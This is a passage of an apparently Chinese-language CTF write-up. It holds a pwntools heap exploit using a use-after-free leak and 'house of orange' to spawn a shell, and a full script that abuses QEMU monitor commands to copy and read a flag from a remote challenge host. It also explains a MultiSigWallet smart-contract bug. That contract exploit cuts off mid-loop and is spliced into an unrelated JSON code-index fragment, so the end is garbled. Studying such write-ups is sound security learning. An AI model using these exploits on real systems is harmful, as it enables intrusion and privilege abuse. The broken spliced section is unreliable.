        allocatehost(0x200)
        p.clean()
        allocatehost(0x200)
        p.clean()
        allocatehost(0x200)
        p.clean()
        allocatehost(0x200)
        p.clean()
        #trigger UAF to leak
        freehost(0)
        freehost(2)
        update(0xb,data2)
        updatehost(0x20,0,'1'*0x20)
        arena_addr=u64(ru("\x00\x00"))
        libc_addr=arena_addr-0x3c4b78 
        libc.address=libc_addr
        lg("libc",libc_addr)
        heap_addr=u64(ru("\x00\x00"))-0x420
        lg("heap",heap_addr)
        allocatehost(0x200)
        update(0xb,data)
        # house of orange
        payload='/bin/sh\x00'+p64(0x61)+p64(0)+p64(heap_addr+0x230)+p64(0)*1+p64(1)
        payload=payload.ljust(216,'\x00')+p64(heap_addr+0x250)
        updatehost(len(payload),0,payload)
        payload=p64(0)*3+p64(0x211)+p64(0)+p64(libc.symbols['_IO_list_all']-0x10)+p64(libc.symbols['system'])*20
        updatehost(len(payload),1,payload)
        updatehost(0x20,2,p64(0)+p64(heap_addr+0x10)*3)
        allocatehost(0x200)
        allocatehost(0x200)
        allocatehost(0x200)
        p.interactive()
## state-of-the-art_vm
一个最新的qemu，查看过devices发现没有自定义devices，根据start.sh发现没有重定向monitor，说明是可以进入monitor的，pwntools中发送\x01可以发送ctrl
+ a，所以\x01c可以进入monitor或者退出monitor。
简单查看后，发现用来执行命令的migrate命令被去掉了，其他命令主要是设备的添加删除等，之后发现qemu存在cdrom，通过info
block可以查看到，ide1-cd0是cdrom设备，对应linux里的/dev/sr0，如果直接cat
/dev/sr0会报错为没有medium，猜想为没有插入cd盘，于是通过change ide1-cd0
./flag尝试将flag作为镜像插入，但是发现cat
/dev/sr0虽然没有报错为没有介质，但是也没有输出，之后尝试使用更长的输入，发现要足够长才能够读出内容。
继续尝试monitor命令发现，通过drive_mirror可以复制文件，通过chardev，backend为tty可以append内容，于是思路为复制文件，之后通过tty添加内容直到足够长，最后通过/dev/sr0读出。  
exp：
    from time import sleep
    from pwn import *
    from hashlib import sha1
    context(os='linux', arch='amd64', log_level='info')
    DEBUG = 0
    if DEBUG:
        p = process(argv='./start.sh', raw=False)
    else:
        p = remote('34.236.229.208', 31338)
    def pow():
        p.recvuntil('that starts with')
        s = p.recvuntil(' and')[:-4]
        p.recvuntil(') starts with ')
        num = p.recvuntil(':')[:-1]
        p.info('s %s' % s)
        p.info('num %s' % num)
        for i in range(100000000):
            sha1_ins = sha1()
            cur = s + str(i)
            sha1_ins.update(cur)
            #p.info('digest %s' % sha1_ins.hexdigest())
            if sha1_ins.hexdigest().startswith('000000'):
                p.recvuntil('work:')
                p.sendline(cur)
                return
        raise Exception('digest not found')
    def main():
        if not DEBUG:
            pow()
        p.recvuntil('# ')
        ctrl_a = '\x01c'
        p.send(ctrl_a)
        # in monitor
        # copy flag
        p.recvuntil('(qemu)')
        p.sendline('change ide1-cd0 flag')
        p.recvuntil('(qemu)')
        p.sendline('drive_mirror ide1-cd0 anciety_flag')
        p.recvuntil('(qemu)')
        p.sendline('change ide1-cd0 flag')
        # append content to my flag
        p.recvuntil('(qemu)')
        p.sendline('chardev-add serial,id=s1,path=anciety_flag')
        p.recvuntil('(qemu)')
        p.sendline('device_add pci-serial,id=ss,chardev=s1')
        p.recvuntil('(qemu)')
        p.send(ctrl_a)
        # now do apppend content
        #p.recvuntil('#')
        sleep(2)
        payload = 'a' * 20
        p.sendline('for i in `seq 1 500`; do echo %s > /dev/ttyS4; done' % payload)
        sleep(2)
        # change image back
        p.send(ctrl_a)
        p.recvuntil('(qemu)')
        p.sendline('device_del ss')
        p.recvuntil('(qemu)')
        p.sendline('chardev-remove s1')
        p.recvuntil('(qemu)')
        p.sendline('block_job_cancel ide1-cd0')
        p.recvuntil('(qemu)')
        p.sendline('change ide1-cd0 anciety_flag')
        p.recvuntil('(qemu)')
        p.sendline(ctrl_a)
        # read flag
        p.sendline('cat /dev/sr0')
        p.recvuntil('#')
        p.sendline('cat /dev/sr0')
        flag = p.sendline('cat /dev/sr0')
        p.success('flag is in %s' % flag)
        p.interactive()
    if __name__ == '__main__':
        main()
# BlockChain
## MultiSigWallet
题目有两个合约，分别是wallet合约和token合约，wallet合约的owner可以添加transaction。而普通用户则可以通过一个id调用对应的的transaction和删除owner添加的transaction。
wallet在处理删除的逻辑中有一个漏洞，那就是他判断了transactions.length>=0才可以删除，删除操作是加transactions.length--,
也就是说transactions.length==0时执行操作会导致length为-1。  
另外wallet 在处理添加transaction是先将incoming transaction assign
给一个全局变量tx，如果判断不是owner就退出，并没有清空全局变量tx。
另外由于transactions.length==-1，所以我们可以call
任何id的transaction，又因为tranctions数组跟tx全局变量都是在storage，所以我们可以先通过
添加transaction将一个调用token合约的transfer函数的transactions写到tx，然后通过精巧的构造id使得transactions[id]正好取到tx，就可以直接转账。拿到flag  
exp如下
    var walletAddr=0;
    var tokenAddr=0;
    for (i = 0; i 
    "usr2func": [{
            "usr": 1676767203992940432,
            "detailed_name": "bool std::Solution::leafSimilar(std::TreeNode *root1, std::TreeNode *root2)",
            "qual_name_offset": 5,
            "short_name_offset": 20,
            "short_name_size": 11,
            "kind": 6,
            "storage": 0,
            "hover": "",
            "comments": "",
            "declarations": [],
            "spell": "38:8-38:19|59306568996318058|2|514",
            "extent": "38:3-46:4|59306568996318058|2|0",
            "bases": [],
            "derived": [],
            "vars": [4479758688836879116, 5761950115933087185, 8289061585496345026, 8002124853696534022, 9726294037205706468, 5268924143191533837, 5026390867008208078, 6655996420844398086, 168502829666687781],
            "uses": [],
            "callees": ["40:8-40:10|1935187987660993811|3|8484", "40:15-40:18|9823770695318396488|3|4", "40:8-40:10|1935187987660993811|3|8484", "40:15-40:18|9823770695318396488|3|4"]
根据spell和extend的内容，可以确认文本，通过int b位置的comment，写有flag is here,通过还原可以得到flag。